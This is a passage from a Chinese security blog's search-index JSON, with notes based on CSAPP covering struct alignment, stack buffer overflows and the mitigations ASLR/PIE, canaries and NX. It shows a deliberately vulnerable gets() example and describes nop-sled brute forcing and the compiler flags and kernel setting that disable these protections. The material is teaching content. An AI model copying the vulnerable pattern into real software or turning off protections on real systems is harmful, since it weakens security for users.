\u7684\u503c\u5148\u5199\u5165\u88ab\u8c03\u7528\u8005\u4fdd\u5b58\u5bc4\u5b58\u5668\u4e2d\uff0c\u4f8b\u5982\u5728\u8c03\u7528 Q(x) \u4e4b\u524d\uff0c\u9700\u8981\u5c06 u \u7684\u503c\u5199\u5165 %rbx \u4e2d\uff0c\u6b64\u65f6 Q \u9700\u8981\u4fdd\u8bc1 %rbx \u7684\u503c\u4e0d\u53d8\uff0c\u6210\u529f\u5b8c\u6210\u4fdd\u5b58\u3002</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_12","title":"\u6570\u636e\u5bf9\u9f50","text":"<p>\u8bb8\u591a\u8ba1\u7b97\u673a\u7cfb\u7edf\u5bf9\u57fa\u7840\u6570\u636e\u7c7b\u578b\u7684\u5408\u6cd5\u5730\u5740\u505a\u4e86\u9650\u5236\uff0c\u8981\u6c42\u67d0\u79cd\u7c7b\u578b\u5bf9\u8c61\u7684\u5730\u5740\u5fc5\u987b\u662f\u67d0\u4e2a\u503c K \u7684\u500d\u6570\uff0c\u53ef\u4ee5\u63d0\u9ad8\u6027\u80fd\u3002</p> <p>\u5bf9\u9f50\u539f\u5219\u4e3a\u4efb\u4f55 K \u5b57\u8282\u7684\u57fa\u672c\u5bf9\u8c61\u7684\u5730\u5740\u5fc5\u987b\u662f K \u7684\u500d\u6570\uff1a</p> <ul> <li>char\uff1a1 \u5b57\u8282</li> <li>short\uff1a2 \u5b57\u8282</li> <li>int\uff0cfloat\uff1a4 \u5b57\u8282</li> <li>long\uff0cdouble\uff0cchar*\uff1a8 \u5b57\u8282</li> </ul> <pre><code>struct S1 {\n  int i;\n  cahr c;\n  int j;\n}\n</code></pre> <p>\u5176\u6709\u4e24\u79cd\u53ef\u80fd\u7684\u5185\u5b58\u5206\u914d\u65b9\u5f0f\uff1a</p> <p></p> <p>\u524d\u8005\u662f\u6700\u5c0f\u5206\u914d\uff0c\u5e76\u672a\u8fdb\u884c\u6570\u636e\u5bf9\u9f50\u3002\u7531\u4e8e j \u4e3a int \u7c7b\u578b\uff0c\u4e3a 4 \u5b57\u8282\uff0c\u6b64\u65f6\u4ed6\u7684\u5730\u5740\u4e5f\u5fc5\u987b\u662f 4 \u7684\u500d\u6570\uff0c\u6b64\u5904\u5730\u5740\u4e3a 5 \u663e\u7136\u4e0d\u6ee1\u8db3\u3002</p> <p>\u4e8e\u662f\u9700\u8981\u63d2\u5165 3 \u4e2a\u7a7a\u767d\u5b57\u8282\u7684\u95f4\u9699\uff08\u84dd\u8272\uff09\uff0c\u6b64\u65f6\u5c31\u6ee1\u8db3\u4e86\u8981\u6c42\uff01</p> <p>\u6709\u65f6\u5019\u867d\u7136\u6bcf\u4e2a\u5143\u7d20\u90fd\u6ee1\u8db3\u5bf9\u9f50\u8981\u6c42\uff0c\u4ecd\u7136\u9700\u8981\u5728\u7ed3\u6784\u4f53\u7684\u672b\u5c3e\u6dfb\u52a0\u7a7a\u767d\u5143\u7d20\uff1a</p> <pre><code>struct S2 {\n  int i;\n  int j;\n  char c;\n}\n</code></pre> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#_13","title":"\u5185\u5b58\u8d8a\u754c\u5f15\u7528\u548c\u7f13\u51b2\u533a\u6ea2\u51fa","text":"<p>C \u5bf9\u4e8e\u6570\u7ec4\u5f15\u7528\u4e0d\u8fdb\u884c\u4efb\u4f55\u8fb9\u754c\u68c0\u67e5\uff0c\u800c\u4e14\u5c40\u90e8\u53d8\u91cf\u548c\u72b6\u6001\u4fe1\u606f\uff08\u4f8b\u5982\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u503c\u548c\u8fd4\u56de\u5730\u5740\uff09\u90fd\u5b58\u653e\u5728\u6808\u4e2d\u3002\u5f53\u4e24\u79cd\u60c5\u51b5\u7ed3\u5408\u5230\u4e00\u8d77\u65f6\uff0c\u4f1a\u5bfc\u81f4\u4e25\u91cd\u7684\u7a0b\u5e8f\u9519\u8bef\uff0c\u5bf9\u8d8a\u754c\u7684\u6570\u7ec4\u5143\u7d20\u7684\u5199\u64cd\u4f5c\u4f1a\u7834\u574f\u5b58\u50a8\u5728\u6808\u4e2d\u7684\u72b6\u6001\u4fe1\u606f\u3002</p> <pre><code>void echo()\n{\n  char buf[8]; // too small!\n  gets(buf);\n  puts(buf);\n}\n</code></pre> <p>\u4f7f\u7528 gets \u51fd\u6570\u4ece\u6807\u51c6\u8f93\u5165\u8bfb\u5165\u4e00\u884c\uff0c\u901a\u8fc7 puts \u8f93\u51fa\u3002\u6ce8\u610f\u8bfb\u5165\u7684\u6570\u636e\u53ef\u80fd\u5927\u4e8e buf \u7684\u957f\u5ea6\uff0c\u56e0\u4e3a gets \u65e0\u6cd5\u786e\u5b9a\u662f\u5426\u4e3a\u4fdd\u5b58\u6574\u4e2a\u5b57\u7b26\u4e32\u5206\u914d\u4e86\u8db3\u591f\u7684\u7a7a\u95f4\u3002</p> <p>\u7531\u4e8e\u6211\u4eec\u53ea\u7ed9 buf \u5206\u914d\u4e86 8 \u5b57\u8282\u957f\u5ea6\uff0c\u56e0\u6b64\u4ecd\u4efb\u4f55\u8d85\u8fc7 7 \u5b57\u8282\u7684\u5b57\u7b26\u4e32\u90fd\u4f1a\u5bfc\u81f4\u5199\u8d8a\u754c\u3002</p> <p>C \u8bed\u8a00\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u662f '\\0'\uff0c\u5360\u7528 1 \u4e2a\u5b57\u8282\u3002</p> <p>\u6c47\u7f16\u4ee3\u7801\u89c1 CSAPP 195\uff0c\u5176\u5bf9\u5e94\u7684\u6808\u5e27\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5b57\u7b26\u4e32\u957f\u5ea6\u4e3a 0 ~ 23 \u5b57\u8282\u65f6\u540e\u679c\u5e76\u4e0d\u4e25\u91cd\uff0c\u4f46\u8d85\u8fc7\u4ee5\u540e\uff0c\u8fd4\u56de\u6307\u9488\u7684\u503c\u5c06\u4f1a\u88ab\u7834\u574f\uff0c\u6b64\u65f6 ret \u6307\u4ee4\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u8df3\u8f6c\u5230\u4e00\u4e2a\u610f\u60f3\u4e0d\u5230\u7684\u4f4d\u7f6e\u3002</p> <p>\u7f13\u51b2\u533a\u6ea2\u51fa\u66f4\u52a0\u81f4\u547d\u7684\u4f7f\u7528\u5c31\u662f\u8ba9\u7a0b\u5e8f\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u4e0b\u9762\u5c06\u4ecb\u7ecd\u51e0\u79cd\u5bf9\u6297\u7f13\u51b2\u533a\u6ea2\u51fa\u653b\u51fb\u7684\u65b9\u6cd5\uff1a</p> <ul> <li>\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff08ASLR\uff09</li> <li>\u6808\u7834\u574f\u68c0\u6d4b\uff08canary\uff09</li> <li>\u9650\u5236\u53ef\u6267\u884c\u4ee3\u7801\u533a\u57df\uff08NX\uff09</li> </ul> <p>\u6b64\u5916 PIE \u6280\u672f\u5f88\u5bb9\u6613\u4e0e ASLR \u6df7\u6dc6\uff0c\u4e5f\u4f1a\u540c\u65f6\u4ecb\u7ecd\uff01</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#1aslr-pie","title":"\u2460ASLR \u4e0e PIE","text":"<p>ASLR</p> <p>\u4e3a\u4e86\u5728\u7cfb\u7edf\u4e2d\u63d2\u5165\u653b\u51fb\u4ee3\u7801\uff0c\u653b\u51fb\u8005\u65e2\u8981\u63d2\u5165\u4ee3\u7801\uff0c\u4e5f\u8981\u63d2\u5165\u6307\u5411\u8fd9\u6bb5\u4ee3\u7801\u7684\u6307\u9488\uff0c\u8fd9\u4e2a\u6307\u9488\u4e5f\u662f\u653b\u51fb\u5b57\u7b26\u4e32\u7684\u4e00\u90e8\u5206\uff0c\u4ea7\u751f\u8fd9\u4e2a\u6307\u9488 \u9700\u8981\u77e5\u9053\u5b57\u7b26\u4e32\u653e\u7f6e\u7684\u6808\u5730\u5740\u3002</p> <p>\u800c\u6808\u968f\u673a\u5316\u7684\u601d\u60f3\uff0c\u53ef\u4ee5\u4f7f\u6808\u7684\u4f4d\u7f6e\u5728\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u65f6\u90fd\u6709\u53d8\u5316\uff0c\u5176\u5b9e\u73b0\u7684\u65b9\u5f0f\u662f\u5728\u7a0b\u5e8f\u5f00\u59cb\u65f6\uff0c\u5728\u6808\u4e0a\u5206\u914d\u4e00\u6bb5\u7a7a\u95f4\uff0c\u4f46\u5e76\u4e0d\u4f7f\u7528\uff0c\u8be5\u7a7a\u95f4\u4f1a\u5bfc\u81f4\u7a0b\u5e8f\u6bcf\u6b21\u6267\u884c\u65f6\u540e\u7eed\u7684\u6808\u4f4d\u7f6e\u90fd\u53d1\u751f\u53d8\u5316\u3002</p> <pre><code>int main(){\n  long local;\n  printf(\"local at %p\\n\", &amp;local);\n  return 0;\n}\n</code></pre> <p>\u5728 32 \u4f4d Linux \u4e0a\u8fd0\u884c\u8be5\u7a0b\u5e8f n \u6b21\uff0c\u5176\u5730\u5740\u53d8\u5316\u8303\u56f4\u4e3a 0xff7fc59c ~ 0xffffd09c\uff0c\u7ea6 \\(2^{23}\\)\uff0c\u5728 64 \u4f4d\u4e0a\u8303\u56f4\u5927\u5c0f\u7ea6 \\(2^{64}\\)\u3002</p> <p>\u6808\u968f\u673a\u5316\u5c5e\u4e8e\u5730\u5740\u7a7a\u95f4\u5e03\u5c40\u968f\u673a\u5316\uff08ASLR\uff09\u4e2d\u7684\u4e00\u79cd\uff0c\u91c7\u7528 ASLR\uff0c\u6bcf\u6b21\u8fd0\u884c\u65f6\u7a0b\u5e8f\u7684\u4e0d\u540c\u90e8\u5206\uff0c\u5305\u62ec\u7a0b\u5e8f\u4ee3\u7801\u3001\u5e93\u4ee3\u7801\u3001\u6808\u3001\u5168\u5c40\u53d8\u91cf\u548c\u5806\u6570\u636e\uff0c\u90fd\u4f1a\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u7684\u4e0d\u540c\u533a\u57df\u3002</p> <p>\u7b80\u5355\u6765\u8bf4\uff0c\u5f53\u7a0b\u5e8f\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u65f6\uff0c\u6216\u8005\u8bf4\uff0c\u6bcf\u4e2a\u7a0b\u5e8f\u7684\u865a\u62df\u5185\u5b58\u5206\u90e8\u662f\u56fa\u5b9a\u7684\uff0c\u4ece\u4f4e\u5230\u9ad8\u5730\u5740\u4f9d\u6b21\u662f\uff1a\u4ee3\u7801\u3001\u5806\u548c\u6808\uff0c\u800c ASLR \u6b63\u662f\u5bf9\u8fd9\u4e09\u8005\u7684\u5730\u5740\u8fdb\u884c\u968f\u673a\u3002</p> <p>\u901a\u5e38 ASLR \u6709 0/\u00bd \u4e09\u79cd\u7ea7\u522b\uff0c\u5176\u4e2d 0 \u8868\u793a ASLR \u672a\u5f00\u542f\uff0c1 \u8868\u793a\u968f\u673a\u5316 stack\u3001libraries\uff0c2 \u8fd8\u4f1a\u968f\u673a\u5316 heap\u3002</p> <p>\u914d\u7f6e ASLR \u7ea7\u522b\uff1a</p> <pre><code>/proc/sys/kernel/randomize_va_space\n</code></pre> <p>\u4fee\u6539\u8be5\u6587\u4ef6\u7684\u503c\uff080/\u00bd\uff09\u5373\u53ef\u5bf9 ASLR \u7ea7\u522b\u8fdb\u884c\u914d\u7f6e\uff0c\u9ed8\u8ba4\u4e3a 2.</p> <p>\u5e38\u7528\u7834\u89e3\u65b9\u6cd5</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5b9e\u9645\u7684\u653b\u51fb\u4ee3\u7801\u524d\u63d2\u5165\u5f88\u957f\u4e00\u6bb5\u7684 nop \u6307\u4ee4\uff0c\u8be5\u6307\u4ee4\u7684\u4f5c\u7528\u662f\u5bf9\u7a0b\u5e8f\u8ba1\u6570\u5668\u52a0 1\uff0c\u4f7f\u5176\u6307\u5411\u4e0b\u4e00\u6761\u6307\u4ee4\uff0c\u6ca1\u6709\u4efb\u4f55\u5176\u4ed6\u6548\u679c\uff0c\u53ea\u8981\u653b\u51fb\u8005\u80fd\u731c\u4e2d\u8fd9\u6bb5\u5e8f\u5217\u4e2d\u7684\u67d0\u4e2a nop \u6307\u4ee4\u7684\u5730\u5740\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5c31\u4f1a\u7ecf\u8fc7\u8fd9\u4e2a nop \u6307\u4ee4\u5e8f\u5217\uff0c\u5230\u8fbe\u653b\u51fb\u4ee3\u7801\u3002</p> <p>\u8fd9\u4e2a\u5e8f\u5217\u7684\u5e38\u7528\u672f\u8bed\u662f \u201c\u7a7a\u64cd\u4f5c\u96ea\u6a47\uff08nop sled\uff09\u201d\uff0c\u610f\u601d\u662f\u7a0b\u5e8f\u4f1a \u201c\u6ed1\u8fc7\u201d \u8fd9\u4e2a\u5e8f\u5217\u3002</p> <p>\u82e5\u6211\u4eec\u5efa\u7acb \\(2^8\\) \u5b57\u8282\u7684 nop sled\uff0c\u90a3\u4e48\u679a\u4e3e \\(2^{23-8} = 2^{15}=32768\\) \u4e2a\u8d77\u59cb\u5730\u5740\u5c31\u80fd\u7834\u89e3 32 \u4f4d Linux \u7684\u968f\u673a\u5316\uff0c\u4f46\u60f3\u679a\u4e3e\u7834\u89e3 64 \u4f4d\u7cfb\u7edf\u8fd8\u662f\u96be\u5ea6\u5f88\u5927\u3002</p> <p>PIE</p> <p>ASRL \u662f\u7cfb\u7edf\u7ea7\u522b\u7684\u6280\u672f\uff0c\u4f5c\u7528\u4e8e\u7a0b\u5e8f\uff08ELF\uff09\u88c5\u5165\u5185\u5b58\u8fd0\u884c\u65f6\uff1b\u800c PIE \u662f\u7f16\u8bd1\u5668\uff08gcc\uff09\u63d0\u4f9b\u7684\u529f\u80fd\uff0c\u4f5c\u7528\u4e8e\u7a0b\u5e8f\uff08ELF\uff09\u7f16\u8bd1\u751f\u6210\u65f6\u3002</p> <p>\u7531\u4e8e ASLR \u662f\u4e00\u79cd\u64cd\u4f5c\u7cfb\u7edf\u5c42\u9762\u7684\u6280\u672f\uff0c\u800c\u4e8c\u8fdb\u5236\u7a0b\u5e8f\u672c\u8eab\u662f\u4e0d\u652f\u6301\u968f\u673a\u5316\u52a0\u8f7d\u7684\uff0c\u4fbf\u51fa\u73b0\u4e86\u4e00\u4e9b\u7ed5\u8fc7\u65b9\u5f0f\uff0c\u4f8b\u5982 ret2plt\uff0cGOT \u52ab\u6301\uff0c\u5730\u5740\u7206\u7834\u7b49\u3002</p> <p>\u4e8e\u662f\uff0c\u4eba\u4eec\u4e8e 2003 \u5e74\u5f15\u5165\u4e86\u4f4d\u7f6e\u65e0\u5173\u53ef\u6267\u884c\u6587\u4ef6\uff08Position - Independent Executable\uff0cPIE\uff09\uff0c\u5176\u5728\u5e94\u7528\u5c42\u7684\u7f16\u8bd1\u5668\u4e0a\u5b9e\u73b0\uff0c\u901a\u8fc7\u5c06\u7a0b\u5e8f\u7f16\u8bd1\u4e3a\u4f4d\u7f6e\u65e0\u5173\u4ee3\u7801\uff08Position - Independent Code\uff0cPIC\uff09\uff0c\u4f7f\u7a0b\u5e8f\u53ef\u4ee5\u88ab\u52a0\u8f7d\u5230\u4efb\u610f\u4f4d\u7f6e\uff0c \u5c31\u50cf\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u5171\u4eab\u5e93\u3002</p> <p>\u4f7f\u7528\u547d\u4ee4 gcc -v \u67e5\u770b gcc \u9ed8\u8ba4\u7684\u5f00\u5173\u60c5\u51b5\u3002\u5982\u679c\u542b\u6709 <code>--enable-default-pie</code> \u53c2\u6570\u5219\u4ee3\u8868 PIE \u9ed8\u8ba4\u5df2\u5f00\u542f\uff0c\u6b64\u65f6\u7f16\u8bd1\u51fa\u6765\u7684 ELF \u7528 <code>file</code> \u547d\u4ee4\u67e5\u770b\u4f1a\u663e\u793a\u5176\u4e3a so\uff0c\u5176\u968f\u673a\u5316\u4e86 ELF \u88c5\u8f7d\u5185\u5b58\u7684\u57fa\u5740\uff08\u4ee3\u7801\u6bb5\u3001plt\u3001got\u3001data \u7b49\u5171\u540c\u7684\u57fa\u5740\uff09\u3002</p> <p>\u82e5\u60f3\u5173\u95ed PIE \u5219\u9700\u8981\u5728\u7f16\u8bd1\u6307\u4ee4\u4e2d\u6dfb\u52a0\u53c2\u6570 <code>-no-pie</code>\u3002</p> <p>\u5728 PIE \u548c ASLR \u540c\u65f6\u5f00\u542f\u7684\u60c5\u51b5\u4e0b\uff0c\u653b\u51fb\u8005\u5c06\u5bf9\u7a0b\u5e8f\u7684\u5185\u5b58\u5e03\u5c40\u4e00\u65e0\u6240\u77e5\uff0c\u4e0a\u8ff0\u7ed5\u8fc7\u65b9\u5f0f\u5747\u5931\u6548\uff0c\u5927\u5927\u589e\u52a0\u4e86\u5229\u7528\u96be\u5ea6\u3002</p> <p>\u5f53\u7136\uff0c\u51e1\u4e8b\u6709\u5229\u4e5f\u6709\u5f0a\uff0c\u5728\u589e\u52a0\u5b89\u5168\u6027\u7684\u540c\u65f6\uff0cPIE \u4e5f\u4f1a\u4e00\u5b9a\u7a0b\u5ea6\u4e0a\u5f71\u54cd\u6027\u80fd\uff0c\u56e0\u6b64\u7edd\u5927\u591a\u6570\u64cd\u4f5c\u7cfb\u7edf\u4e0a PIE \u4ec5\u7528\u4e8e\u5bf9\u4e00\u4e9b\u5b89\u5168\u6027\u8981\u6c42\u8f83\u9ad8\u7684\u7a0b\u5e8f\u3002</p> <p>\u6ce8\u610f\uff0cPIE \u5fc5\u987b \u5728 ASLR \u81f3\u5c11\u4e3a 1 \u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u751f\u6548\uff0c\u82e5\u4e3a 0 \u7ea7\uff0c\u4e0d\u4f1a\u751f\u6548\u3002</p> <p>\u4e3a\u4ec0\u4e48\u5462\uff0c\u56e0\u4e3a PIE \u662f\u80fd\u529b\u8d4b\u4e88\uff0cASLR \u662f\u771f\u6b63\u4f7f\u7528\u80fd\u529b\u3002</p> <p>\u800c\u4e14\u5728\u5f00\u542f PIE \u7684\u60c5\u51b5\u4e0b\uff0c\u5373\u4fbf ASLR \u4e3a 1\uff0c\u5bf9 heap \u7684\u968f\u673a\u5316\u4e5f\u4f1a\u751f\u6548\uff0c\u56e0\u4e3a\u6539\u53d8\u4e86\u57fa\u5740\u3002</p> <p>\u5177\u4f53\u5b9e\u9a8c\u63a8\u8350\u67e5\u770b\uff1a\u5173\u4e8e Linux \u4e0b ASLR \u4e0e PIE \u7684\u4e00\u4e9b\u7406\u89e3</p> <p>32 \u4f4d\u4e0b\uff0c\u540c\u65f6\u5f00\u542f ASLR \u4e0e PIE \u5982\u4e0b\u56fe\u6240\u793a\u3002\u53ef\u4ee5\u770b\u5230 PIE \u7684\u4f5c\u7528\u662f\u4f7f\u4ee3\u7801\u548c\u6570\u636e\u7684\u5b57\u8282\u968f\u673a\uff0c\u540c\u65f6\u4e5f\u4f1a\u81ea\u7136\u5f71\u54cd\u5230\u5806\u5730\u5740\uff08ASLR = 2\uff09</p> <p></p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#2canary","title":"\u2461canary","text":"<p>\u8ba1\u7b97\u673a\u7684\u7b2c\u4e8c\u9053\u9632\u7ebf\u662f\u80fd\u591f\u68c0\u6d4b\u5230\u4f55\u65f6\u6808\u5df2\u7ecf\u88ab\u7834\u574f\u3002\u4e0a\u6587\u63d0\u5230\uff0c\u7834\u574f\u901a\u5e38\u53d1\u751f\u5728\u8d85\u8d8a\u5c40\u90e8\u7f13\u51b2\u533a\u7684\u8fb9\u754c\u65f6\u3002GCC \u5728\u6700\u8fd1\u7684\u7248\u672c\u4e2d\u52a0\u5165\u4e86 \u6808\u4fdd\u62a4\u8005\uff08stack protector\uff09 \u673a\u5236\uff0c\u7528\u4e8e\u68c0\u6d4b\u5bf9\u7f13\u51b2\u533a\u8d8a\u754c\u7684\u8bfb\u5199\u3002</p> <p>\u6808\u7834\u574f\u68c0\u6d4b\u7684\u601d\u60f3\u662f\u5728\u6808\u5e27\u4e2d\u4efb\u4f55\u5c40\u90e8\u7f13\u51b2\u533a\u4e0e\u6808\u72b6\u6001\u4e4b\u95f4\u5b58\u50a8\u4e00\u4e2a\u7279\u6b8a\u7684 \u91d1\u4e1d\u96c0\u503c\uff08canary\uff09 \u4e5f\u79f0\u4e3a \u54e8\u5175\u503c\uff08guard value\uff09\u3002</p> <p>canary \u662f\u5728\u7a0b\u5e8f\u6bcf\u6b21\u8fd0\u884c\u65f6\u968f\u673a\u4ea7\u751f\u7684\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u6ca1\u6709\u7b80\u5355\u7684\u65b9\u6cd5\u83b7\u53d6\u5176\u5177\u4f53\u503c\uff0c\u5176\u88ab\u5b58\u653e\u5728\u4e00\u4e2a\u7279\u6b8a\u7684 \u53ea\u8bfb\u6bb5 \u4e2d\uff0c\u5982\u6b64\uff0c\u653b\u51fb\u8005\u4e5f\u65e0\u6cd5\u8986\u5199 canary \u503c\u3002</p> <p>\u5728\u6062\u590d\u5bc4\u5b58\u5668\u72b6\u6001\u548c\u4ece\u51fd\u6570\u8fd4\u56de\u4e4b\u524d\uff0c\u7a0b\u5e8f\u68c0\u67e5 canary \u662f\u5426\u88ab\u8be5\u51fd\u6570\u7684\u67d0\u4e2a\u64cd\u4f5c\u6216\u8005\u8be5\u51fd\u6570\u8c03\u7528\u7684\u67d0\u4e2a\u51fd\u6570\u7684\u67d0\u4e2a\u64cd\u4f5c\u6539\u53d8\u4e86\uff0c\u82e5 \u53d1\u73b0canary \u88ab\u7be1\u6539\uff0c\u5219\u7a0b\u5e8f\u5c06\u5f02\u5e38\u7ec8\u6b62\u3002</p> <p>\u901a\u8fc7\u547d\u4ee4\u884c\u9009\u9879 <code>-fno-stack-protector</code> \u53ef\u4ee5\u963b\u6b62 GCC \u4ea7\u751f cannary \u4fdd\u62a4\u4ee3\u7801\uff0c\u5426\u5219\u5c06\u9ed8\u8ba4\u751f\u6210\u3002</p> <p>\u672f\u8bed\u201c\u91d1\u4e1d\u96c0\u201d\u6e90\u4e8e\u5386\u53f2\u4e0a\u7528\u8fd9\u79cd\u9e1f\u5728\u7164\u77ff\u4e2d\u5bdf\u89c9\u6709\u6bd2\u7684\u6c14\u4f53</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u82e5 buf \u6ea2\u51fa\uff0c\u5219\u6808\u4e2d\u4fdd\u5b58\u7684 Canary \u5904\u7684\u503c\u548c\u771f\u6b63\u7684\u5728\u7279\u6b8a\u53ea\u8bfb\u6bb5\u4e2d\u7684 Canary \u7684\u771f\u503c\u5c06\u4e0d\u76f8\u540c\uff0c\u5f53\u51fd\u6570\u6267\u884c\u5b8c\u6bd5\u8fd4\u56de\u4e4b\u524d\uff0c\u68c0\u6d4b\u6808\u4e0a\u7684 Canary \u53d1\u73b0\u88ab\u7be1\u6539\uff0c\u5219\u8ba4\u4e3a\u4f8b\u5982 %ebp \u7b49\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u4fe1\u606f\u3001Return address \u4e5f\u88ab\u7be1\u6539\uff0c\u7a0b\u5e8f\u5c06\u5f02\u5e38\u7ec8\u6b62\uff01</p>"},{"location":"security/%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%80%86%E5%90%91/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/#3nxdep","title":"\u2462NX\uff08DEP\uff09","text":"<p>\u7b2c\u4e09\u9053\u9632\u7ebf\u662f\u6d88\u9664\u653b\u51fb\u8005\u5411\u7cfb\u7edf\u4e2d\u63d2\u5165\u53ef\u6267\u884c\u4ee3\u7801\u7684\u80fd\u529b\u3002\u5982\u4f55\u6d88\u9664\u5462\uff1f</p> <p>\u4e00\u79cd\u65b9\u6cd5\u662f\u9650\u5236\u90a3\u4e9b\u5185\u5b58\u533a\u57df\u80fd\u591f\u5b58\u653e\u53ef\u6267\u884c\u4ee3\u7801\u3002\u5728\u5178\u578b\u7684\u7cfb\u7edf\u4e2d\uff0c\u53ea\u6709\u4fdd\u5b58\u7f16\u8bd1\u5668\u4ea7\u751f\u7684\u4ee3\u7801\u7684\u5185\u5b58\u533a\u57df\u624d\u9700\u8981\u662f\u53ef\u6267\u884c\u7684\uff0c\u5176\u4ed6\u533a\u57df\u5747\u53ef\u4ee5\u88ab\u9650\u5236\u4e3a\u53ea\u5141\u8bb8\u8bfb\u5199\uff0c\u800c\u4e0d\u5141\u8bb8\u6267\u884c\u3002</p> <p>\u6839\u636e\u865a\u62df\u5185\u5b58\u7684\u77e5\u8bc6\uff0c\u865a\u62df\u5185\u5b58\u7a7a\u95f4\u5728\u903b\u8f91\u4e0a\u88ab\u5206\u6210\u4e86\u9875\uff0c\u5178\u578b\u7684\u6bcf\u9875 2048 \u6216 4096 \u5b57\u8282\uff0c\u786c\u4ef6\u652f\u6301\u591a\u79cd\u5f62\u5f0f\u7684\u5185\u5b58\u4fdd\u62a4\uff0c\u80fd\u591f\u6307\u660e\u7528\u6237\u7a0b\u5e8f\u548c\u7cfb\u7edf\u5185\u6838\u6240\u5141\u8bb8\u7684\u8bbf\u95ee\u6a21\u5f0f\uff0c\u901a\u5e38\u5206\u4e3a\u4e09\u79cd\u8bbf\u95ee\u6a21\u5f0f\uff1a</p> <ul> <li>\u8bfb\uff08\u4ece\u5185\u5b58\u8bfb\u6570\u636e\uff09</li> <li>\u5199\uff08\u5b58\u50a8\u6570\u636e\u5230\u5185\u5b58\uff09</li> <li>\u6267\u884c\uff08\u5c06\u5185\u5b58\u7684\u5185\u5bb9\u770b\u505a\u662f\u673a\u5668\u7ea7\u4ee3\u7801\uff09</li> </ul> <p>\u4ee5\u524d\uff0cX86 \u4f53\u7cfb\u5c06\u8bfb\u548c\u6267\u884c\u8bbf\u95ee\u63a7\u5236\u5408\u5e76\u4e3a\u540c\u4e00\u4e2a 1 \u4f4d\u7684\u6807\u5fd7\uff0c\u5373\u53ef\u8bfb\u7684\u9875\u5fc5\u5b9a\u53ef\u6267\u884c\uff0c\u800c\u6808\u5fc5\u987b\u662f\u53ef\u8bfb\u5199\u7684\uff0c\u56e0\u6b64\u6808\u4e0a\u7684\u5b57\u8282\u4e5f\u5fc5\u987b\u662f\u53ef\u6267\u884c\u7684\u3002\u867d\u7136\u6709\u5f88\u591a\u5176\u4ed6\u673a\u5236\u53ef\u4ee5\u9650\u5236\u67d0\u4e9b\u9875\u53ef\u8bfb\u4f46\u4e0d\u53ef\u5199\uff0c\u4f46\u90fd\u4f1a\u5e26\u6765\u4e25\u91cd\u7684\u6027\u80fd\u635f\u5931\u3002</p> <p>\u7136\u540e\u6700\u8fd1 AMD \u4e3a 64 \u4f4d\u5904\u7406\u5668\u7684\u5185\u5b58\u4fdd\u62a4\u5f15\u5165\u4e86 NX\uff08No-Execute\uff09\u4f4d\uff0c\u5c06\u8bfb\u548c\u6267\u884c\u8bbf\u95ee\u6a21\u5f0f\u533a\u5206\u5f00\u6765\uff0c\u800c Inter \u4e5f\u968f\u540e\u8ddf\u8fdb\u3002</p> <p>\u81f3\u6b64\uff0c\u6808\u53ef\u4ee5\u88ab\u6807\u8bb0\u4e3a\u53ef\u8bfb\u548c\u53ef\u5199\uff0c\u4f46\u4e0d\u53ef\u6267\u884c\uff0c\u7531\u4e8e\u68c0\u67e5\u9875\u662f\u5426\u53ef\u6267\u884c\u7531\u786c\u4ef6\u5b8c\u6210\uff0c\u6ca1\u6709\u6027\u80fd\u635f\u5931\u3002</p> <ul> <li>\u53ef\u5199\u3001\u4e0d\u53ef\u6267\u884c\uff1a\u6808\u3001\u5806\u3001\u6570\u636e</li> <li>\u4e0d\u53ef\u5199\u3001\u53ef\u6267\u884c\uff1a\u53ea\u8bfb\u6570\u636e\u3001\u4ee3\u7801</li> </ul> <p>GCC \u9ed8\u8ba4\u542f\u7528 NX \u9009\u9879\uff0c\u901a\u8fc7\u6dfb\u52a0 <code>-z execstack</code> \u5173\u95ed NX\u3002</p> <p>\u5728 Linux \u4e0b\u79f0\u4e3a NX\uff0c\u5728 Windows \u4e0b\u79f0\u4e3a DEP\u3002</p> <p>\u76ee\u524d\u6765\u8bf4\uff0c\u4e00\u65e6\u5f00\u542f 